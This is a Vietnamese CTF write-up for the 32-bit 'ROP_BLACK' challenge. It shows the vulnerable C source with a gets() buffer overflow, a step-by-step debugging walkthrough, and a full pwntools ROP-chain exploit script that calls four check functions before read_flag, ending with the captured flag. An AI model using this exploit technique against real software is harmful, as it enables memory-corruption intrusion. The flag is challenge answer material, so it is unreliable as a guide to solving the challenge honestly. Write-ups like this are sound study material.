# ROP_BLACK

**source C:**

```
#include <stdio.h>
#include <stdlib.h>

int check_file = 0;
int african = 0;
int invite_code = 0;
int capcha = 0;


void read_flag(){
	if(!(check_file && african && invite_code && capcha)) {
		printf("403|You aren't allowed to read the flag!\n");
		exit(1);
	}
	
	char flag[65];
	FILE * f = fopen("flag.txt","r");
	if (f == NULL){
		printf("flag.txt doesn't exist, try again on the server\n");
		exit(0);
	}
    fgets( flag, 65, f );
    printf("%s\n",flag);
    fflush(stdout);
}

void check_flag(char* file) {
	if(strcmp(file, "flag.txt") == 0) {
		check_file = 1;
	}
}

void check_african() {
	african = 1;
}

void check_invitecode(int code) {
	if(code == 0xbae) {
		invite_code = 1;
	}
}

void check_capcha(int login, int auth) {
	if(login == 0x062023 && auth == 0xbf1212) {
		capcha = 1;
	}
}

void vuln()
{
	char buffer[10];

	printf("check your identity and read the flag.\n");
	gets(buffer);
}

int main(){

	vuln();
}

```
**checks và vm:**


![image](https://github.com/gookoosss/CTF.-/assets/128712571/ab8d528f-60ea-4e01-b0f7-ee991d345ee1)


**hmm phân tích sơ qua source nha:**

- ở hàm vuln có lỗi BOF ta có thể khai thác bằng cách ret2win
- tại hàm read_flag có if phải thỏa 4 biến check_file , african, invite_code và capcha phải khác 0, muốn nó khác 0 thì ta phải đi qua 4 hàm của nó để đổi nó thành 1

```
if(!(check_file && african && invite_code && capcha)) {
		printf("403|You aren't allowed to read the flag!\n");
		exit(1);
	}
```

- hướng làm của ta bây giờ phải đi qua 4 hàm của các biến rồi với đi qua hàm read_flag là sẽ qua flag

**tóm tắt:**


**ret2win -> check_capcha -> check_invitecode -> check_african -> check_flag -> read_flag -> end**

oke h ta tính offset rồi **ret2win** vào **check_capcha** chạy thử xem sao:


![image](https://github.com/gookoosss/CTF.-/assets/128712571/33790e30-0910-4450-87e7-545dee4b71b5)


tại đây nó so sánh **ebp+0x8 với 0x62023** và **ebp+0xc với 0xbf1212** , nên ta phải gán vào **2 stack trên giá trị 0x62023 và 0xbf1212**

**vấn đề xảy ra ở đây là nếu ta gán 0xbf1212 và 0x62023 vào stack thì khi kết thúc hàm check_capcha nó sẽ trỏ vào tiếp vào địa chỉ ko hợp lý dẫn đến lỗi** 

cách giải quyết bây giờ ta phải tìm **ropgadget** hợp lý để sau khi kết thúc các hàm nó sẽ trỏ đến **ropgadget**, sau đó sẽ **pop các giá trị 0x62023 và 0xb1212** vào thanh ghi nào đó để đến lệnh ret sẽ trỏ đến địa chỉ hợp lệ ta cần 


![image](https://github.com/gookoosss/CTF.-/assets/128712571/04e32e31-f347-4dc2-8d76-00186ad35b04)


mình sẽ chọn **0x080493e9**

bây giờ mình sẽ chạy thử đoạn script này xem sao:

```
payload = b'a'*22 #offset 
payload += p32(exe.sym['check_capcha'])
payload += p32(pop_esi_edi_ebp) + p32(0x062023) + p32(0xbf1212) + p32(0x804ca00)
payload += p32(exe.sym['check_invitecode'])
payload += p32(pop_esi_edi_ebp) + p32(0xbae) + p32(0xbae) + p32(0x804ca00)
```


![image](https://github.com/gookoosss/CTF.-/assets/128712571/08de151a-7d04-4c14-8b08-3f23de771e38)


lúc này ret trỏ đến địa chỉ hợp lệ nên sẽ chạy tiếp và ko báo lỗi 


![image](https://github.com/gookoosss/CTF.-/assets/128712571/f9f9dfb1-1d6e-4c96-a17b-76c091dc9d36)


lúc này **pop_esi_edi_ebp** sẽ **gán 0x62023 và 0xbf1212 vào esi và edi** nên sẽ đẩy 0xbae lên vị trí rbp+0x8 thỏa điều kiện hàm **check_invitecode**

h ta sẽ chạy nốt các hàm còn lại là xong 

```
payload = b'a'*22 #offset 
payload += p32(exe.sym['check_capcha'])
payload += p32(pop_esi_edi_ebp) + p32(0x062023) + p32(0xbf1212) + p32(0x804ca00)
payload += p32(exe.sym['check_invitecode'])
payload += p32(pop_esi_edi_ebp) + p32(0xbae) + p32(0xbae) + p32(0x804ca00)
payload += p32(exe.sym['check_african'])
payload += p32(exe.sym['check_flag'])
payload += p32(exe.sym['read_flag']+1)
```




![image](https://github.com/gookoosss/CTF.-/assets/128712571/6b6bfd1f-4933-4824-af52-9ea11d78d056)


hmm lỗi rồi nè, debug lại xem sao có lỗi ở đâu


![image](https://github.com/gookoosss/CTF.-/assets/128712571/75aad704-c44d-4a7f-9c3e-f120cb6e0526)


à thì ra ở đây nó so sánh địa chỉ của **file flag.txt** với  **rbp+0x0** nên ta chỉ cần gán **rbp+0x0** bằng địa chỉ **flag.txt** là ra rồi 

**script:**

```
from pwn import *

context.binary = exe = ELF('./rop_black',checksec=False)

p = process(exe.path)
# p = remote('chall.battlectf.online',1004)

pop_esi_edi_ebp = 0x080493e9

gdb.attach(p, gdbscript = '''
b*vuln+43
b*vuln+48
c
''')

input()

payload = b'a'*22 #offset 
payload += p32(exe.sym['check_capcha'])
payload += p32(pop_esi_edi_ebp) + p32(0x062023) + p32(0xbf1212) + p32(0x804ca00)
payload += p32(exe.sym['check_invitecode'])
payload += p32(pop_esi_edi_ebp) + p32(0xbae) + p32(0xbae) + p32(0x804ca00)
payload += p32(exe.sym['check_african'])
payload += p32(exe.sym['check_flag'])
payload += p32(exe.sym['read_flag']+1)
# payload += p32(0x804a033)

p.sendline(payload)

p.interactive()
```



![image](https://github.com/gookoosss/CTF.-/assets/128712571/0c1a51e0-8354-490e-a660-e59e614c3859)


lúc này ta làm đúng rồi nè

**flag:**

**battleCTF{rop_Afr1cA_x_7352adb6a9fd43b762413112a9695fde}**






